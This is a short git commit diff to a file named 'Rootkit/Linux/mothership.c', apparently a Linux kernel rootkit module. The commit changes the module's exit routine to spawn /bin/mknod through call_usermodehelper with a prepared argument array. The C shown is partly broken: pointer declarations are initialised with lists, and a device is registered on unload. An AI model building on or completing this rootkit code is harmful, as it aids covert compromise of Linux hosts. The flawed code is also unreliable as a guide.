941300ebc837641bfabdd445ad8671491e757f98
oonray <alexanderbjornsrid@gmail.com>
2019-02-03 13:47:41 +0100

    fixed env

--- Rootkit/Linux/mothership.c
+++ Rootkit/Linux/mothership.c
@@ -62,9 +62,11 @@ static int __init mothership_init(void)
 static void __exit mothership_exit(void)
 {  
 	static char *envp = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+	static char *args = { DEVICE_NAME, "c", major };
+
 	printk(KERN_INFO "%s[-]%s Module Unloaded.\n",KRED,KNRM);
 	register_chrdev(major,DEVICE_NAME);
-	call_usermodehelper("/bin/mknod", [DEVICE_NAME, "c", major] , envp, UMH_NO_WAIT);
+	call_usermodehelper("/bin/mknod", args , envp, UMH_NO_WAIT);
 }
 
 static int dev_open(struct inode* inodep,struct file *file){
